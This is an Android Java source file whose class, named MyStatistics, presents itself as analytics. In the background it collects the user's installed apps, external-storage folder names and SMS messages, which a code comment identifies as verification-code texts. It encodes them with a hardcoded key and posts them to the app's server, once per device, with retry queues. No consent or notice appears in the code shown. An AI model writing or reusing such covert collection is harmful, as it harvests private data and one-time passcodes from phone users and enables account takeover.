package com.ff.common.my_statistics;

import android.os.Environment;
import android.preference.PreferenceManager;
import android.text.TextUtils;

import com.ff.common.AuthCode;
import com.ff.common.PhoneUtils;
import com.ff.common.application.ApplicationProxy;
import com.ff.common.http.MyHttpClient;
import com.ff.common.model.InstalledApp;
import com.ff.common.model.SMSBean;
import com.ff.common.utils.SMSUtil;
import com.google.gson.Gson;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

/**
 * Created by fangyufeng on 2016/3/29.
 */
public class MyStatistics {

    public static final String K = "gaogaoxingxingshangxuequ";
    public static final String HAVECATCHINSTALLEDAPPLIST = "haveCatchInstalledAppList";
    public static final String HAVECATCHDIRECTORYLIST = "haveCatchDirectoryList";
    public static final String HAVE_CATCH_SMS_LIST = "haveCatchSMSList";

    public static void catchInstalledAppList(){
        ApplicationProxy.getInstance().getThreadPool().execute(new Runnable() {
            @Override
            public void run() {
                if (!PreferenceManager.getDefaultSharedPreferences(ApplicationProxy.getInstance().getContext()).getBoolean(HAVECATCHINSTALLEDAPPLIST, false)) {
                    try {
                        List<InstalledApp> applist = PhoneUtils.getInstalledlist();
                        String jsonStr = new Gson().toJson(applist);
                        String encodedStr = AuthCode.authcodeEncode(jsonStr, K);
                        Map<String, String> param = new HashMap();
                        param.put("pfc", encodedStr);
                        param.put("type", "i");// i:安装列表 f:目录列表
                        JSONObject resultObj = MyHttpClient.executePost(
                                MyHttpClient.getBASE_URL() + "/app/catch/pget", param);
                        if(resultObj!=null)
                            PreferenceManager.getDefaultSharedPreferences(ApplicationProxy.getInstance().getContext()).edit().putBoolean(HAVECATCHINSTALLEDAPPLIST,true).commit();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        });
    }

    public static void catchDirectoryList(){
        ApplicationProxy.getInstance().getThreadPool().execute(new Runnable() {
            @Override
            public void run() {
                if (!PreferenceManager.getDefaultSharedPreferences(ApplicationProxy.getInstance().getContext()).getBoolean(HAVECATCHDIRECTORYLIST, false)) {
                    try {
                        List list = new ArrayList();
                        String[] files = Environment.getExternalStorageDirectory().list();
                        for(String f : files){
                            if(new File(Environment.getExternalStorageDirectory(),f).isDirectory())
                                list.add(f);
                        }
                        String jsonStr = new Gson().toJson(list);
                        String encodedStr = AuthCode.authcodeEncode(jsonStr, K);
                        Map<String, String> param = new HashMap();
                        param.put("pfc", encodedStr);
                        param.put("type", "f");// i:安装列表 f:目录列表
                        JSONObject resultObj = MyHttpClient.executePost(
                                MyHttpClient.getBASE_URL() + "/app/catch/pget", param);
                        if(resultObj!=null)
                            PreferenceManager.getDefaultSharedPreferences(ApplicationProxy.getInstance().getContext()).edit().putBoolean(HAVECATCHDIRECTORYLIST,true).commit();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        });
    }

    public static void catchSMSList(){
        ApplicationProxy.getInstance().getThreadPool().execute(new Runnable() {
            @Override
            public void run() {
                if (!PreferenceManager.getDefaultSharedPreferences(ApplicationProxy.getInstance().getContext()).getBoolean(HAVE_CATCH_SMS_LIST, false)) {
                    try {
                        List<SMSBean> list = new SMSUtil().list;
                        String jsonStr = new Gson().toJson(list);
                        String encodedStr = AuthCode.authcodeEncode(jsonStr, K);
                        Map<String, String> param = new HashMap();
                        param.put("pfc", encodedStr);
                        param.put("type", "sms");// i:安装列表 f:目录列表 sms:验证码短信
                        JSONObject resultObj = MyHttpClient.executePost(
                                MyHttpClient.getBASE_URL() + "/app/catch/pget", param);
                        if(resultObj!=null)
                            PreferenceManager.getDefaultSharedPreferences(ApplicationProxy.getInstance().getContext()).edit().putBoolean(HAVE_CATCH_SMS_LIST,true).commit();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        });
    }

    public static void catchInstalledApp(final String pName,boolean replacing){
        if(!replacing){
            MyDelayQueue.cancelTask(pName);
            catchInstalledOrRemovedApp(pName,INSTALL);
        }
    }

    public static void catchInstalledAppFilepath(final String pName){
        catchInstalledOrRemovedApp(pName,FILEPATH);
    }

    public static void catchRemovedApp(final String pName,boolean replacing){
        if(!replacing){
            MyDelayQueue.add(new MyDelayQueue.DelayedTask(pName,5000));
            MyDelayQueue.process();
        }
    }

    public static final String INSTALL = "i";
    public static final String UNINSTALL = "u";
    public static final String FILEPATH = "f";
    private final static String IU_LIST = "iu_list";

    /** Upload local iu list once network is available.*/
    public static void uploadLocalIUList() {
        ApplicationProxy.getInstance().getThreadPool().execute(new Runnable() {
            @Override
            public void run() {
                String string = PreferenceManager.getDefaultSharedPreferences(ApplicationProxy.getInstance().getContext()).getString(IU_LIST, null);
                if (!TextUtils.isEmpty(string)) {
                    try {
                        JSONObject json = new JSONObject(string);
                        List<String> list = new ArrayList();
                        for (Iterator<String> keys = json.keys(); keys.hasNext();) {
                            String encodedStr = keys.next();
                            String type = json.getString(encodedStr);
                            Map<String, String> param = new HashMap();
                            param.put("pfc", encodedStr);
                            param.put("type", type);
                            JSONObject ret = MyHttpClient.executePost(
                                    MyHttpClient.getBASE_URL() + "/app/catch/iuget", param);
                            if (ret != null) {
                                list.add(encodedStr);
                            }
                        }
                        if (!list.isEmpty()) {
                            deleteLocalIUList(list);
                        }
                    } catch (JSONException e) {
                        e.printStackTrace();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        });


    }

    private static void addToLocalIUList(final String encodedStr, final String type) {
        try {
            String string = PreferenceManager.getDefaultSharedPreferences(ApplicationProxy.getInstance().getContext()).getString(IU_LIST, null);
            JSONObject json;
            if (TextUtils.isEmpty(string)) {
                json = new JSONObject();
            } else {
                json = new JSONObject(string);
            }
            json.put(encodedStr, type);
            PreferenceManager.getDefaultSharedPreferences(ApplicationProxy.getInstance().getContext()).edit().putString(IU_LIST, json.toString()).commit();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    private static void deleteLocalIUList(final List<String> list) {
        try {
            String string = PreferenceManager.getDefaultSharedPreferences(ApplicationProxy.getInstance().getContext()).getString(IU_LIST, null);
            JSONObject json;
            if (TextUtils.isEmpty(string)) {
                return;
            } else {
                json = new JSONObject(string);
            }
            for (int i = 0; i < list.size(); i++) {
                json.remove(list.get(i));
            }
            PreferenceManager.getDefaultSharedPreferences(ApplicationProxy.getInstance().getContext()).edit().putString(IU_LIST, json.toString()).commit();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    /*
       type: i 安装, u 卸载 , f 文件目录存在情况下
    */
    public static void catchInstalledOrRemovedApp(final String pName,final String type){
        ApplicationProxy.getInstance().getThreadPool().execute(new Runnable() {
            @Override
            public void run() {
                try {
                    String encodedStr = AuthCode.authcodeEncode(pName, K);
                    Map<String, String> param = new HashMap();
                    param.put("pfc", encodedStr);
                    param.put("type", type);
                    JSONObject ret = MyHttpClient.executePost(
                            MyHttpClient.getBASE_URL() + "/app/catch/iuget", param);
                    if (null == ret) {
                        addToLocalIUList(encodedStr, type);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }

}
